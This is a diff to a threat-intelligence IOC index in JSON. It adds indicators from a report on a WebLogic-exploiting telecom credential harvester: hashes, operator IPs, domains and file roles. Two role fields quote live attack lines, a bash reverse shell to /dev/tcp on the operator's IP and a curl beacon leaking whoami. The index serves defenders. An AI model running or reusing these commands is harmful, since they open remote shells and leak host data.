@@ -1,10 +1,10 @@
 {
- "generated_at": "2026-08-21T12:15:30Z",
+ "generated_at": "2026-09-02T00:00:19Z",
  "counts": {
-  "indicators": 1753,
-  "reports": 55,
-  "multi_report": 142,
-  "suppressed_benign": 129
+  "indicators": 1878,
+  "reports": 56,
+  "multi_report": 143,
+  "suppressed_benign": 134
  },
  "coverage": {
   "indexed": [
@@ -45,6 +45,7 @@
    "nsminer-cryptojacker.json",
    "open-directory-172-105-0-126-20260406-iocs.json",
    "open-directory-94-103-1-13-20260423-iocs.json",
+   "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-iocs.json",
    "opendirectory-193-56-255-154-20260403-iocs.json",
    "opendirectory-216-126-227-49-cve-2026-41940-cpanel-harvester-20260517-iocs.json",
    "opendirectory-45-130-148-125-20260430-iocs.json",
@@ -65,7 +66,6 @@
    "webshells-to-the-cloud.json"
   ],
   "embargoed": [
-   "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-iocs.json",
    "opendirectory-157-180-101-47-ssh-mitm-parasitic-credential-theft-20260812-iocs.json"
   ],
   "unknown": [],
@@ -368,6 +368,14 @@
    "report_url": "/reports/open-directory-94-103-1-13-20260423/",
    "detection_url": "/hunting-detections/open-directory-94-103-1-13-20260423-detections",
    "ioc_url": "/ioc-feeds/open-directory-94-103-1-13-20260423-iocs.json"
+  },
+  "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817": {
+   "title": "Carrier Credential Harvesting Through a Customer's Router",
+   "date": "2026-08-18",
+   "severity": "high",
+   "report_url": "/reports/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817/",
+   "detection_url": "/hunting-detections/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-detections",
+   "ioc_url": "/ioc-feeds/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-iocs.json"
   },
   "opendirectory-193-56-255-154-20260403": {
    "title": "Open Directory at 193.56.255.154 — XiebroC2 v3.1 & Covenant C2",
@@ -6131,6 +6139,10 @@
     "role": "Chisel tunneling tool, Go 1.23.1, 9.8 MB"
    },
    {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "PE64 Go binary"
+   },
+   {
     "report": "seasia-gov-exploitation-toolkit-144-172-106-236",
     "role": "PE32+ Go executable"
    }
@@ -6158,6 +6170,10 @@
    {
     "report": "open-directory-94-103-1-13-20260423",
     "role": "PuTTY plink SSH client, used for SSH tunneling"
+   },
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "PE32 executable"
    }
   ],
   "sha256:4430a828f2b19bc729b2eea0405b27d19c568a769b12f0731c720a0ed888de1b": [
@@ -6402,6 +6418,740 @@
   "ipv4:37.17.245.209": [
    {
     "report": "open-directory-94-103-1-13-20260423"
+   }
+  ],
+  "sha256:953b668e95e033b34de0373af354cfd1d5557edf8cdfa49887cabf2b44d67b65": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "ELF64 Go binary"
+   }
+  ],
+  "sha256:891c4bb6b5c94b28867535c1ec71561be75b30da47554fbf6d55ae7f0d86be8b": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "ELF64 Go binary"
+   }
+  ],
+  "sha256:a133809a768c7c6b958d72ff6857677b14ed6bf284b99dc81a121442dfe04f90": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "ELF64 native C binary"
+   }
+  ],
+  "sha256:ee2d150a2f73a561983088a6b1a6a2b1c452777aaf03181387708c6907ac6dcd": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "C source, 1951 lines"
+   }
+  ],
+  "sha256:daee2d57566c88374b5de65ecc04e1321da4d5dc35b84a0eb98893afad9e2664": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "gzip tar archive"
+   }
+  ],
+  "sha256:72c6383477bbcb93811fd837a9e4721cfddea0cd238eebe3012acc0e6a31c40e": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:5f2efa79f548b648a318e6c6f3512581574002b79fab97cfec10b77feba177b8": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator listener log"
+   }
+  ],
+  "filename:serve_http.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator listener log"
+   }
+  ],
+  "sha256:80b9a4c5cde7f1793b4123662b2dddc2b3801e09fdc7ed8c295e10bad3397b9b": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Raw TCP capture log"
+   }
+  ],
+  "filename:exfil_capture.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Raw TCP capture log"
+   }
+  ],
+  "sha256:6ce28a27af3bf7732952461c6d6003c53ee0c367563f941b8dd481aefa2e7454": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator log"
+   }
+  ],
+  "filename:exfil_cores_batch.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator log"
+   }
+  ],
+  "sha256:395d83618e1ad08a61a70405f9c41f38202ad273ec2f748017a934c5a5020a32": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text"
+   }
+  ],
+  "filename:lua_source.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text"
+   }
+  ],
+  "sha256:a71223b4b7d092f5a0cbcece6df94f907572f090c5db6bb68bcaaeb077c744d7": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Core-dump Lua source carver with Spanish comments"
+   }
+  ],
+  "sha256:57808e07ba7745a2d598f630db9c6a671fe5cca005c6dbf4239b8ad794277143": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:9f2302cd9698895ac3d83e44fc0b3c99767cc1561bb18de6a2fb31acb5c15feb": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:d2ba9a1859464c4f08c47643d2e157400a94b31b429d4415acb4389944ee016a": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:45534cd8555fb79ebae27aaea8a6fbaec70d41ef5d9bc0a9415ed72e7ad23b00": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:25e713913758006835da0c0aa3aa621c37e21498114dadc8c4a8c00d6997d99b": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator log"
+   }
+  ],
+  "filename:docker_output.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator log"
+   }
+  ],
+  "sha256:fa433bbbc82c572c838ac6a9f0bdde3634c8fbae4178d3660bf0dcb1a958e262": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:10ff5a12a4380e7e3209cd2c1cab14c1329160fb88d0ede2e4450e8ade6f4b79": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Syntactically broken earlier draft of the C2 console client logic"
+   }
+  ],
+  "sha256:6457ff57de0ee5b12abf6e3c8291e69718ea6ded741af51807259c692e7071c5": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "domain:i786.sh": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:bfb79c2d47b7bbd0cfc17782014eb7a57b73834ab93d49d7dd1e6942693ac8f2": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "domain:so.sh": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Shell script"
+   }
+  ],
+  "sha256:676437728db9710c645d509d7ccc517864a263914f9a152c1d49cad3106df900": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:fd628df5bf58c7abaebfca3ecfe504511080872bf1687ec2dd39d1d4cd3f0aab": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:dcd739dfe08285c08200be926905155576bedc4e5633b5f02561ec7f80d512f1": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "GeoServer default-credential test and CVE-2024-36401 OGC-filter RCE test against CATASTRO"
+   }
+  ],
+  "sha256:ce2bb74025dc77d4d5c506b990633f526f4f3f4ca849db7c0025d42d10a8529a": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "domain:decrypt3des.py": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:19957b57916b3133fd69ca925304b1260c92d1f3b6857bcb9b48606b583a6455": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "JSP webshell"
+   }
+  ],
+  "sha256:9251373f585c91b6bf7c407aa1a989e7cc596c4afc79a8573a18f858df9f014d": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+   }
+  ],
+  "filename:string_payload.bin": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+   }
+  ],
+  "sha256:5a8aa26793cc031314eba327f40e384e2e0d009a7183e344e5db11f2cd3b185f": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+   }
+  ],
+  "filename:iiop_resp.bin": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+   }
+  ],
+  "sha256:08ae961db6b2564e26ba55ebe8aaf31920dc418b55010b0a2401ed995552c347": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "domain:genbypass.java": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "sha256:4bb64940f1f08d23a5b0733369a40f349dce28a8e677577e44dbf0d61ceb6faf": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "sha256:9bebcc8ccfb9207b8265c85a4896760b8adee5deea0c2f57e6b08fc56a29e2ec": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "CVE-2024-21182 server-side JNDI resolution variant"
+   }
+  ],
+  "domain:exploit21182.java": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "CVE-2024-21182 server-side JNDI resolution variant"
+   }
+  ],
+  "sha256:c17736b8535359e385fdc3e242d2a36c3b921469229c256947695a4716ad0e4d": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "domain:xds.java": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "sha256:dbbdffa94caf45a4c1f9132fa7c5bfc6a4c20ee104440ba964cc99ea9850facb": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+   }
+  ],
+  "domain:xscan.java": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+   }
+  ],
+  "sha256:fa930afe099b266006f22fe75245f4d52b52a11de7280b6c2cff8e3a4e4b3e06": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "domain:ssrft3.java": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "sha256:65bd20aa232157ee4015e1d5b8939e953db0dd69a3c86a7387a33aedd2288b85": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator-written T3 client with enum, bind and lookup actions. The CVE-2023-21839 trigger"
+   }
+  ],
+  "sha256:5182ec0b8959cc554c8f3e06e8fad7a94b71f11de29d7c9c462fb500ef9d33bb": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java source"
+   }
+  ],
+  "sha256:4d53fc510a54cc1d3f9f6e8c14cb62bb784267ebcf15b6fc4126901fd81c32cc": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Reverse shell payload: bash -i >& /dev/tcp/13.140.145.210/4445 0>&1"
+   }
+  ],
+  "sha256:4430563acc3e61903969f077fa2f868cc75158ec6719abb4031c115aa7e895ab": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Beacon payload: curl http://13.140.145.210:4445/CLASS-RCE-$(whoami)"
+   }
+  ],
+  "sha256:58475dcbda931c31e45a83884e366a28b34aaa9099bab8b2e38590824e3b61b3": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Compiled reverse-shell payload class"
+   }
+  ],
+  "sha256:a93d8af6748c9c8ff1dbdffeed317cf81fe7777f25daf5c8feb44aa64d600463": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "nmap output"
+   }
+  ],
+  "filename:ssrf_results.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "nmap output"
+   }
+  ],
+  "sha256:403aad5736161e9b36c4f2c9a4451d0146b870c76627cc0afb28f2c038ab9af2": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 52027 lines"
+   }
+  ],
+  "filename:movistar_wordlist.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 52027 lines"
+   }
+  ],
+  "sha256:7477eea61182c26fdd26e688bcc4f6ae87347e9a9290b81aae21b2fd71db0984": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 55576 lines"
+   }
+  ],
+  "filename:combined_wordlist.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 55576 lines"
+   }
+  ],
+  "sha256:1766fd750011ad5d3b4f98357acb418f8ee07587c558c7fbe5169b7f3d8285c0": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 77360 lines"
+   }
+  ],
+  "filename:hybrid_wordlist.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text, 77360 lines"
+   }
+  ],
+  "sha256:f03e4111413befd8e44035c7fa56abf48fb12a0d03a6eda5662de33ffe47e2e7": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTML page"
+   }
+  ],
+  "filename:sph_cve.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTML page"
+   }
+  ],
+  "sha256:1f135e2ede4d2389e481d51d046e533ac485d15dc83396818d41bb81c7e84045": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTTP response"
+   }
+  ],
+  "filename:wl_t3.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTTP response"
+   }
+  ],
+  "sha256:885cfb5bfd041b8efd885860add9661eeab6086d2eb91997fffc420738e42ade": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTTP response"
+   }
+  ],
+  "filename:wl_resp.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTTP response"
+   }
+  ],
+  "sha256:610ff467df7cf2ea672762f4fd63c9a817b7d5f18f290efe8bdf239ddc8031f7": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTML page"
+   }
+  ],
+  "filename:t35.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Captured HTML page"
+   }
+  ],
+  "sha256:fa434d13bee84e9a4ccfffbd8df2852d9d1238f8222bf806506b108d21924557": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "X.509 certificate"
+   }
+  ],
+  "domain:c.pem": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "X.509 certificate"
+   }
+  ],
+  "sha256:7b699b24025e3d71fd83dd766c7b842579cf28527f22a8fd5c9097ceaa7a013d": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Private key for the operator certificate above"
+   }
+  ],
+  "domain:k.pem": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Private key for the operator certificate above"
+   }
+  ],
+  "sha256:1351c03f626745cacd97f957419559da442264c0e0c4b100f496199dbd6301cc": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text"
+   }
+  ],
+  "filename:pkg_names.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Text"
+   }
+  ],
+  "sha256:5ce9cdc2d2d5f5fd053ef7438626a9c98bc92ecc1eb2960fc6cffdc94e0ab550": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Minimal Windows reconnaissance drop writing to out.txt"
+   }
+  ],
+  "filename:r.bat": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Minimal Windows reconnaissance drop writing to out.txt"
+   }
+  ],
+  "sha256:fae8fe13ac0e717d99f992fba9186aa37fb706058fe7762993717366f653d14a": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Retail-bank password-reset endpoint probe, customerId iteration at escalating concurrency"
+   }
+  ],
+  "sha256:626856f44bba5e61c878c2e2be54f3aa12a2fdee602634706917bc77aaaa4ef5": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Second retail-bank probe variant capturing HTTP status codes"
+   }
+  ],
+  "sha256:9e683ccc4baa5efdf4b643ade417cf56b729c5da1d351495d4317272b15f925f": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Third retail-bank probe variant, concurrency escalated to 500"
+   }
+  ],
+  "filename:chisel_win.exe": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "PE64 Go binary"
+   }
+  ],
+  "sha256:0a76c28f5452dbbc146752d0b4e28b10779a337091f59650b94f5e938545572c": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Stock jpillora chisel v1.23.1 linux/amd64"
+   }
+  ],
+  "sha256:e5621ffe4879f0ec39ed40f688db9399c2d43054d41ef14472fa335c4693b915": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "PE32 executable"
+   }
+  ],
+  "sha256:53517fdc0d386c7dfd4546e9e83150f85dab0662dbcaf9bf0f9dd82fab3a07e9": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java archive"
+   }
+  ],
+  "filename:jndiexploit.jar": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Java archive"
+   }
+  ],
+  "sha256:628e3af996c506671d978026496c28e2ec0b4bc3a91302257d3b508d1ebd61f6": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Python script"
+   }
+  ],
+  "sha256:a652e3ae426e614844a5970154cb2a2e1465ab6fe73bbd3df47abeb6bdf859eb": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+   }
+  ],
+  "domain:poc21839.py": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+   }
+  ],
+  "sha256:1079a2f628fd6a33dae90515ecebecabf66eb3952c39635fd495dd3718173f64": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator staging-server log"
+   }
+  ],
+  "filename:http80.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator staging-server log"
+   }
+  ],
+  "sha256:35792ca59beddfc9905c06c1a22b35b367d4f39083a0e59aea3a197f33af36e0": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server on port 443 with reverse SOCKS session establishment"
+   }
+  ],
+  "filename:chisel443.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server on port 443 with reverse SOCKS session establishment"
+   }
+  ],
+  "sha256:4e722db95bf034806bf181f11065c6cb28578074b9fa613fd5018d1370db7ba2": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server on port 80 with SOCKS session"
+   }
+  ],
+  "filename:chisel80.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server on port 80 with SOCKS session"
+   }
+  ],
+  "sha256:04dbe46cf060c2de75ff04a13b0f2b48253c1b03a638a2afdae3cccdeeae500c": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Additional chisel sessions, source of two of the four server key fingerprints"
+   }
+  ],
+  "filename:chisel_new.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Additional chisel sessions, source of two of the four server key fingerprints"
+   }
+  ],
+  "sha256:e74276ce204476787aaa65c0f0604707c918a06b724ceaa98eb57f2105c65157": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server startup log"
+   }
+  ],
+  "filename:chisel_server.log": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "chisel server startup log"
+   }
+  ],
+  "sha256:abcb8e8bd371549af056f973b95cceae9156b5b96e80facbc19db009347b2924": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+   }
+  ],
+  "filename:proxychains_chisel.conf": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+   }
+  ],
+  "sha256:3fbfafab2e467055e22cf88719f081770fda732c278ad7244c938308f6b28c96": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "proxychains config chaining onward to the internal CATASTRO target"
+   }
+  ],
+  "filename:proxychains_catastro.conf": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "proxychains config chaining onward to the internal CATASTRO target"
+   }
+  ],
+  "sha256:75f99724611c680400f2ba567b71522a63122b0510ea7ef35c2696dd61666ecf": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "JNDI callback listener on port 4445 recording no inbound connection"
+   }
+  ],
+  "filename:jndi_cb.txt": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "JNDI callback listener on port 4445 recording no inbound connection"
+   }
+  ],
+  "sha256:e447cbfbb5e82bd6b924cd6d9265d022a9ab576898c34ee6b854b9269ff9e870": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Leaks the name of an unarchived carrier-targeting script: /tmp/andinet.sh line 122"
+   }
+  ],
+  "ipv4:13.140.145.210": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator VPS and collection point"
+   }
+  ],
+  "domain:vmi3432966.contaboserver.net": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator VPS and collection point"
+   }
+  ],
+  "ipv4:95.214.114.37": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator attack-source VPN exit"
+   }
+  ],
+  "domain:radius-sync.com": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Operator-owned domain"
+   }
+  ],
+  "url:http://13.140.145.210/": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Exfiltration destination in the WSMA fileCopy dstURL"
+   }
+  ],
+  "url:http://13.140.145.210:4445/": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Beacon and reverse-shell callback endpoint"
+   }
+  ],
+  "url:http://13.140.145.210:8888/": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817",
+    "role": "Open directory and javaCodeBase staging URL for JNDI reference payloads"
+   }
+  ],
+  "sha256:3797dddabdef5e9607c9c0bde108922467adf15d5e29cd6c6319df91b334a0c9": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "sha1:aab136e06c94e5616832afa34af096bd6b77151c": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "sha1:373b099212237996e4394bdf8dd5a27715dccf13": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "sha256:e788774dfe961c999953ef72a208f198c58c47f14d4b7777d50abee835d75fff": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:140.99.223.46": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:147.124.203.51": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:62.133.46.18": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
+  "ipv4:146.70.52.222": [
+   {
+    "report": "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+   }
+  ],
